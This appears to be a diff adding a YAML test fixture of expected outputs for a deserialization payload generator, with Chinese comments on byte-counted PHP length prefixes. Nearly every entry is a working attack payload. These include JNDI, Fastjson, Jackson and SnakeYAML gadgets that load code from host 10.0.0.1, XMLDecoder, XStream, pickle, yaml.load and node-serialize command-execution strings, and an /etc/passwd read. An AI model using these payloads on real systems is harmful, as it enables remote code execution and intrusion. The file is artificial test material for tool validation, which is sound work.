@@ -1,0 +1,250 @@
+# 反序列化黄金样本（§13.2）
+#
+# 这批的重点是 `<<len(NAME)>>` 这个计算型占位符——PHP 序列化的长度前缀是**字节**数，
+# 中文值会暴露「按字符数算」这个错。另外 XMLDecoder / node-serialize / SnakeYAML
+# 分别落在 xml / json / yaml 三种内容类型上，前两种有可靠 parser。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= Java =================
+
+  - name: JNDI 注入（LDAP）
+    state:
+      vuln: deser
+      template: deser.java.jndi.ldap
+      vars: {lhost: "10.0.0.1", lport: "1389", name: "exp"}
+      outputs: [raw]
+    expect:
+      payload: "${jndi:ldap://10.0.0.1:1389/exp}"
+
+  - name: Fastjson JdbcRowSetImpl
+    state:
+      vuln: deser
+      template: deser.java.fastjson.jdbcrowset
+      vars: {lhost: "10.0.0.1", lport: "1389", name: "exp"}
+      outputs: [raw]
+    expect:
+      payload: "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://10.0.0.1:1389/exp\",\"autoCommit\":true}"
+      syntax: ok
+
+  - name: Jackson 多态
+    state:
+      vuln: deser
+      template: deser.java.jackson.jdbcrowset
+      vars: {lhost: "10.0.0.1", lport: "1389", name: "exp"}
+      outputs: [raw]
+    expect:
+      payload: "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://10.0.0.1:1389/exp\",\"autoCommit\":true}]"
+      syntax: ok
+
+  - name: XMLDecoder 执行命令
+    state:
+      vuln: deser
+      template: deser.java.xmldecoder.process
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <java version="1.8.0" class="java.beans.XMLDecoder">
+         <object class="java.lang.ProcessBuilder">
+          <array class="java.lang.String" length="3">
+           <void index="0"><string>/bin/sh</string></void>
+           <void index="1"><string>-c</string></void>
+           <void index="2"><string>id</string></void>
+          </array>
+          <void method="start"/>
+         </object>
+        </java>
+      syntax: ok
+
+  - name: XMLDecoder 读文件
+    state:
+      vuln: deser
+      template: deser.java.xmldecoder.file
+      vars: {filepath: "/etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <java version="1.8.0" class="java.beans.XMLDecoder">
+         <object class="java.io.File">
+          <string>/etc/passwd</string>
+         </object>
+        </java>
+      syntax: ok
+
+  - name: XStream 动态代理
+    state:
+      vuln: deser
+      template: deser.java.xstream.dynamicproxy
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <sorted-set>
+          <string>foo</string>
+          <dynamic-proxy>
+            <interface>java.lang.Comparable</interface>
+            <handler class="java.beans.EventHandler">
+              <target class="java.lang.ProcessBuilder">
+                <command>
+                  <string>/bin/sh</string>
+                  <string>-c</string>
+                  <string>id</string>
+                </command>
+              </target>
+              <action>start</action>
+            </handler>
+          </dynamic-proxy>
+        </sorted-set>
+      syntax: ok
+
+  - name: SnakeYAML ScriptEngineManager
+    state:
+      vuln: deser
+      template: deser.java.snakeyaml.scriptengine
+      vars: {lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        !!javax.script.ScriptEngineManager [
+          !!java.net.URLClassLoader [[
+            !!java.net.URL ["http://10.0.0.1/"]
+          ]]
+        ]
+      # yaml 没有可用的安全 parser，如实返回未校验
+      syntax: unchecked
+
+  # ================= PHP：长度前缀按字节算 =================
+
+  - name: PHP 序列化裸字符串（ASCII）
+    state:
+      vuln: deser
+      template: deser.php.syntax.string
+      vars: {value: "admin"}
+      outputs: [raw]
+    expect:
+      payload: 's:5:"admin";'
+
+  - name: PHP 序列化裸字符串（中文）—— 长度必须是字节数
+    state:
+      vuln: deser
+      template: deser.php.syntax.string
+      vars: {value: "管理员"}
+      outputs: [raw]
+    expect:
+      # "管理员" 是 3 个字符但 9 个字节；写成 s:3: 会直接解析失败
+      payload: 's:9:"管理员";'
+
+  - name: PHP 序列化数组
+    state:
+      vuln: deser
+      template: deser.php.syntax.array
+      vars: {key: "user", value: "admin"}
+      outputs: [raw]
+    expect:
+      payload: 'a:1:{s:4:"user";s:5:"admin";}'
+
+  - name: PHP 序列化自定义对象
+    state:
+      vuln: deser
+      template: deser.php.syntax.object
+      vars: {cls: "User", prop: "name", value: "admin"}
+      outputs: [raw]
+    expect:
+      payload: 'O:4:"User":1:{s:4:"name";s:5:"admin";}'
+
+  - name: PHP 序列化布尔
+    state:
+      vuln: deser
+      template: deser.php.syntax.boolean
+      outputs: [raw]
+    expect:
+      payload: "b:1;"
+
+  - name: PHP SoapClient（三处长度前缀都自动算）
+    state:
+      vuln: deser
+      template: deser.php.soapclient.ssrf
+      vars: {uri: "http://a/", loc: "http://10.0.0.1/"}
+      outputs: [raw]
+    expect:
+      # http://10.0.0.1/ 是 16 个字符（含末尾斜杠）
+      payload: 'O:10:"SoapClient":3:{s:3:"uri";s:9:"http://a/";s:8:"location";s:16:"http://10.0.0.1/";s:15:"_stream_context";i:0;}'
+
+  - name: 变量没填时 <<len()>> 与 <<NAME>> 一起保留字面量
+    state:
+      vuln: deser
+      template: deser.php.syntax.string
+      outputs: [raw]
+    expect:
+      # 契约 3：未提供的变量原样透传。产出明显不可用的串，而不是静默算错长度
+      payload: 's:<<len(value)>>:"<<value>>";'
+
+  # ================= Python =================
+
+  - name: pickle 协议 0（纯 ASCII）
+    state:
+      vuln: deser
+      template: deser.python.pickle.proto0
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: |-
+        cos
+        system
+        (S'id'
+        tR.
+
+  - name: yaml.load 命令执行
+    state:
+      vuln: deser
+      template: deser.python.yaml.load
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: '!!python/object/apply:os.system ["id"]'
+
+  - name: pickle 协议 0 经 builtins.eval
+    state:
+      vuln: deser
+      template: deser.python.pickle.proto0.eval
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: |-
+        cbuiltins
+        eval
+        (S'__import__("os").popen("id").read()'
+        tR.
+
+  - name: pickle 外层包装（二进制载荷走外部生成器）
+    state:
+      vuln: deser
+      template: deser.python.pickle.b64
+      vars: {b64: "gASVBgAAAAAA"}
+      outputs: [raw]
+    expect:
+      payload: "gASVBgAAAAAA"
+
+  # ================= Node =================
+
+  - name: node-serialize 立即执行函数
+    state:
+      vuln: deser
+      template: deser.node.serialize.rce
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}"
+      syntax: ok
+
+  - name: funcster 原型链逃逸
+    state:
+      vuln: deser
+      template: deser.node.serialize.constructor
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{\"rce\":\"_$$ND_FUNC$$_function(){return this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}()\"}"
+      syntax: ok
